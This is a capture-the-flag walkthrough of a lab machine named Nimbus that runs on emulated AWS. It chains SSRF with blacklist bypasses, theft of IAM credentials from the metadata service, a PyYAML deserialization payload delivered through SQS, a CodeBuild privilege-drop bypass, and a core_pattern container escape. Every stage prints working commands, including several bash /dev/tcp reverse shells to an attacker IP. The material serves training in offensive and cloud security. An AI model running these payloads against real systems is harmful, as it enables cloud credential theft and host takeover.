# Nimbus

## Recon

### Full Port Scan

```shell
sudo nmap -sT --min-rate 10000 -p- 10.129.19.128 -oA nmapscan/ports
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Service Detection

```shell
sudo nmap -sT -sC -sV -O -p22,80 10.129.19.128 -oA nmapscan/detail
```

```
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
```

Port 80 redirects to the virtual host `nimbus.htb`, so add it to `/etc/hosts`:

```shell
echo "10.129.19.128 nimbus.htb" | sudo tee -a /etc/hosts
```

### Subdomain Enumeration

```shell
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.19.128/ -H "Host: FUZZ.nimbus.htb" -ac
```

```
aws         [Status: 403, Size: 305, Words: 28, Lines: 8, Duration: 29ms]
```

There is an `aws` subdomain. Add `aws.nimbus.htb` to `/etc/hosts`. The name strongly hints the app runs on (an emulation of) AWS, which turns out to be the theme of the whole box.

## Foothold Part 1: SSRF

The main site has a `Submit Job` feature with two tabs, `By URL` and `Paste YAML`. The `By URL` fetcher makes the server retrieve a URL we provide. Point it at a listener on our own host:

```
http://10.10.15.172/x.yaml
```

The server connects back to us, confirming **SSRF**: the server will fetch arbitrary URLs on our behalf, including things on its own internal network that we cannot reach directly.

![](assets/Pasted%20image%2020260620220455.png)

Direct attempts at localhost are blocked:

```
http://127.0.0.1/?x=.yaml
http://localhost/?x=.yaml
```

`127.1` is an alternate notation for the same loopback address, which slips past the blacklist:

```
http://127.1/?x=.yaml
```

![](assets/Pasted%20image%2020260620215031.png)

Brute force the internal ports 1-9999 through the SSRF. Ports **5000** and **9090** respond.

![](assets/Pasted%20image%2020260620214638.png)

Port 5000 is just the job app we already saw.

![](assets/Pasted%20image%2020260620215112.png)

Port 9090 returns something different:

![](assets/Pasted%20image%2020260620215534.png)

```json
<ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>InvalidClientTokenId</Code>
    <Message>The security token included in the request is invalid.</Message>
  </Error>
  <RequestId>p7518495-adc4-1191-49n2-4m70d8sdf922</RequestId>
</ErrorResponse>
```

This is an **AWS STS** error. Confirmation that there is an AWS-style metadata/credential surface reachable from inside the box.

## Foothold Part 2: Stealing IAM Credentials via IMDS

Every AWS EC 2 instance exposes the **Instance Metadata Service (IMDS)** at the fixed link-local address `169.254.169.254`. A machine can query it to read its own identity, including the temporary credentials of the IAM role attached to it. It is only reachable from the instance itself, but we have SSRF, so we query it through the server.

`169.254.169.254` as a single decimal integer is `2852039166`:

```
http://2852039166/latest/meta-data/?x=.yaml
```

```
ami-id
hostname
iam/
instance-id
instance-type
local-hostname
local-ipv4
placement/
security-groups
```

Walk the IAM path to get the role name. It shows the name is `nimbus-web-role`.

```
http://2852039166/latest/meta-data/iam/security-credentials/?x=.yaml
```

Then read the role's credentials:

```
http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=.yaml
```

```json
{
  "Code": "Success",
  "LastUpdated": "2026-06-20T20:11:33Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
  "Expiration": "2026-06-21T02:11:33Z"
}
```

The `ASIA` prefix marks these as STS temporary credentials. Load them into the environment:

```shell
export AWS_ACCESS_KEY_ID=ASIAQX4PG7L2K9M3N5R8
export AWS_SECRET_ACCESS_KEY=bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs
export AWS_SESSION_TOKEN='IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJ......'
export AWS_DEFAULT_REGION=us-east-1
```

Confirm the identity against the AWS endpoint:

```shell
aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
```

```json
{
    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
    "Account": "847219365028",
    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
}
```

We are now acting as `nimbus-web-role`.

## Foothold Part 3: SQS Message Queue Deserialization

Enumerate what the role can reach. Listing SQS queues:

```shell
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
```

```json
{
    "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
    ]
}
```

**SQS** is AWS's message queue. The web app drops "jobs" onto the `nimbus-jobs` queue, and a background worker pulls them off and processes them. The worker parses each job's body as YAML using an unsafe loader. In PyYAML, the `!!python/object/apply` tag instructs the parser to construct a Python object and call a function, so a body like `!!python/object/apply:os.system ["..."]` runs an arbitrary command when the worker deserializes it. We control the queue, so we control that command.

Start a listener:

```shell
rlwrap ncat -nvlp 9001
```

Send a malicious job carrying a reverse shell payload:

```shell
aws --endpoint-url http://aws.nimbus.htb sqs send-message --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs --message-body '!!python/object/apply:os.system ["bash -c \"bash -i >& /dev/tcp/10.10.15.172/9001 0>&1\""]'
```

Get a reverse shell and the user flag.

![](assets/Pasted%20image%2020260624205314.png)

We are inside a Docker container as an unprivileged user:

```shell
worker@d840eed0256a:/app$ id
uid=1000(worker) gid=1000(worker) groups=1000(worker)
worker@d840eed0256a:/app$ ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 Jun 24 16:26 /.dockerenv
```

## Privilege Escalation Part 1: Worker Container to Root via CodeBuild

The worker runs as uid=1000 with no effective capabilities, so a direct escape is not possible. But from inside the container the internal Docker network is reachable, including the **LocalStack** instance at `floci:4566`. (LocalStack is a local emulation of AWS, which is what this whole box runs on.) Unlike the external `aws.nimbus.htb` endpoint, which enforced IAM permissions, the internal LocalStack interface accepts any credentials: `test` / `test` gives full administrative access to every emulated service.

### Discovering CodeBuild

List CodeBuild projects against the internal endpoint. An empty list (rather than an error) confirms the service is up and we can create and run build jobs:

```shell
AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test aws --endpoint-url http://floci:4566 --region us-east-1 codebuild list-projects
```

CodeBuild runs an arbitrary build script in a container we define, and it lets us request `privilegedMode: true`, which is exactly what we need.

### Bypassing the Privilege Drop with BASH_FUNC_id

The `floci/floci:latest` image's entrypoint checks the output of `id` and drops to a non-root user if the effective UID is 0. The check relies on bash command substitution, which we can subvert: bash imports environment variables named `BASH_FUNC_<name>%%` as shell **functions** of that name. By exporting a fake `id` function that always prints `uid=1000`, the entrypoint's `id` call hits our function, believes it is not root, and skips the drop. The container keeps running as real UID 0.

```json
{"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}
```

A first test project was used to verify the bypass worked end to end, then deleted. The real attack uses a second project whose buildspec is a reverse shell.

### Getting the Root Shell

Create the project with `privilegedMode: true`, the `id` override, and a reverse-shell buildspec:

```shell
AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test aws --endpoint-url http://floci:4566 --region us-east-1 codebuild create-project --cli-input-json '{
  "name": "pwn2",
  "source": {
    "type": "NO_SOURCE",
    "buildspec": "version: 0.2\nphases:\n  build:\n    commands:\n      - bash -i >& /dev/tcp/10.10.15.172/5555 0>&1"
  },
  "artifacts": {"type": "NO_ARTIFACTS"},
  "environment": {
    "type": "LINUX_CONTAINER",
    "image": "floci/floci:latest",
    "computeType": "BUILD_GENERAL1_SMALL",
    "privilegedMode": true,
    "environmentVariables": [
      {"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}
    ]
  },
  "serviceRole": "arn:aws:iam::847219365028:role/codebuild-role"
}'
```

Start a listener:

```shell
rlwrap ncat -nvlp 5555
```

Launch the build:

```shell
AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test aws --endpoint-url http://floci:4566 --region us-east-1 codebuild start-build --project-name pwn2
```

This delivers a shell as **root** inside the privileged CodeBuild container.

## Privilege Escalation Part 2: Container Escape via core_pattern

We are root in a privileged container, but still in a container. The Linux kernel's `core_pattern` usermode-helper gives a path out.

When a process crashes and generates a core dump, the kernel reads `/proc/sys/kernel/core_pattern`. If the value starts with `|`, the kernel executes the named program **as root on the host**, outside any container namespace. Because the container is privileged, we can write `core_pattern`.

### Finding the Overlay Upperdir

The catch is that the kernel runs the program using a host path, while our script lives inside the container. The container's filesystem is an overlay mount whose writable layer (upperdir) physically sits on the host. So a file we create inside the container at `/escape.sh` exists on the host at `$UDIR/escape.sh`. Extract that host path:

```shell
UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
echo $UDIR
```

### Writing the Escape Script

Write a script (inside the container) that connects back to our listener. Because of the overlay, it lands at `$UDIR/escape.sh` on the host. The kernel runs the handler with no inherited terminal, so the payload must establish its own connection; `bash -i >& /dev/tcp/...` is self-contained and works here:

```shell
printf '#!/bin/sh\nbash -c "bash -i >& /dev/tcp/10.10.15.172/6666 0>&1"\n' > /escape.sh
chmod +x /escape.sh
```

### Setting core_pattern and Triggering the Crash

Start a listener on the attack machine:

```shell
rlwrap ncat -nvlp 6666
```

Point `core_pattern` at the host path of our script:

```shell
echo "|${UDIR}/escape.sh" > /proc/sys/kernel/core_pattern
```

Force a process to crash so the kernel invokes the handler:

```shell
ulimit -c unlimited
sleep 100 &
PID=$!
kill -SEGV $PID
```

The kernel runs `escape.sh` as root on the host, outside the container, and we receive a root shell on the listener and the root flag.

![](assets/Pasted%20image%2020260624214419.png)

## Summary

This box is a full cloud-attack chain on an emulated AWS environment (LocalStack):

- **SSRF:** The job fetcher makes the server request arbitrary URLs. `127.1` and decimal-IP notation bypass the loopback blacklist.
- **IMDS credential theft:** Use the SSRF to read `169.254.169.254` and steal the `nimbus-web-role` IAM temporary credentials.
- **SQS deserialization RCE:** With those credentials, drop a malicious YAML job (`!!python/object/apply:os.system`) onto the SQS queue; the worker deserializes it unsafely and runs the payload, giving a shell in the worker container.
- **CodeBuild privesc:** The internal LocalStack endpoint accepts any credentials. Abuse CodeBuild with `privilegedMode` and a `BASH_FUNC_id%%` trick to defeat the image's privilege-drop, landing root in a privileged container.
- **core_pattern escape:** From the privileged container, set `core_pattern` to a `|`-prefixed host path (resolved via the overlay upperdir) and trigger a crash, executing a reverse shell as root on the host.